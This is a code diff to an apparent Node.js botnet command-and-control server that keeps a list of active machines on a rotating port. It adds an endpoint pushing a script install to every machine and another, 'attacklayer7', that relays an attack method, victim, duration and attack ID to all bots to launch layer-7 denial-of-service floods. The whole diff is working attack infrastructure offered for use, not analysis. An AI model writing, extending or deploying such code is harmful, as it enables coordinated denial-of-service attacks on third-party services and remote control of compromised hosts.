@@ -36,6 +36,7 @@ let AGENTLINK = null
 let SERVICELINK = null
 let SERVICENAME = null
 let SCRIPTS = null
+let CURRENTPORT = null
 let activeMachines = []
 const dbok = new EventEmitter()
 
@@ -233,6 +234,38 @@ app.get('/heartbeat', (req, res) => {
     res.send(200, "OKAY")
 })
 
+app.get('/all/installscript/:scriptid', (req, res) => {
+    clen = activeMachines.length
+    for (let index = 0; index < clen; index++) {
+        console.log(`Asking ${activeMachines[index]}:${CURRENTPORT}`);
+        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/installScript/${req.params.scriptid}`)
+        .then(res => {
+            console.log(res.data)
+        })
+        .catch(err => {
+            console.error(err); 
+        })
+        
+    }
+    res.send(200, "OKAY")
+})
+
+app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', (req, res) => {
+    clen = activeMachines.length
+    for (let index = 0; index < clen; index++) {
+        console.log(`http://${activeMachines[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`);
+        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
+        .then(res => {
+            console.log(res.data)
+        })
+        .catch(err => {
+            console.error(err.response); 
+        })
+        
+    }
+    res.send(200, "OKAY")
+})
+
 app.get('/globals', (req, res) => {
     axios.get("http://localhost:3000/global")
     .then(resp => {
@@ -326,6 +359,7 @@ function initiate() {
         })
     axios.get("http://localhost:3000/global")
         .then(res => {
+            CURRENTPORT = res.data.port.number
             if ((res.data).port.changeAt < moment().utc()) {
                 //console.log("Scheduling port change.");
                 schedulePortChange()
@@ -342,6 +376,7 @@ async function changePort(newport, logid) {
             logger.info(logid, "Changing port.", "Response for the current settings recieved.")
             let global = res.data
             global.port.number = parseInt(newport)
+            CURRENTPORT = parseInt(newport)
             axios.patch("http://localhost:3000/global", global)
             .then(res => {
                 logger.info(logid, "Changed port.", `Successfuly switched to port ${res.data.port.number}.`)
@@ -402,6 +437,7 @@ function checkSelf(){
                 schedulePortChange()
                 global.port.last = global.port.number
                 global.port.number = global.port.changeTo
+                CURRENTPORT = global.port.changeTo
                 global.port.changedLast = Date.now()
                 axios.patch("http://localhost:3000/global", global)
                 .then(res => {
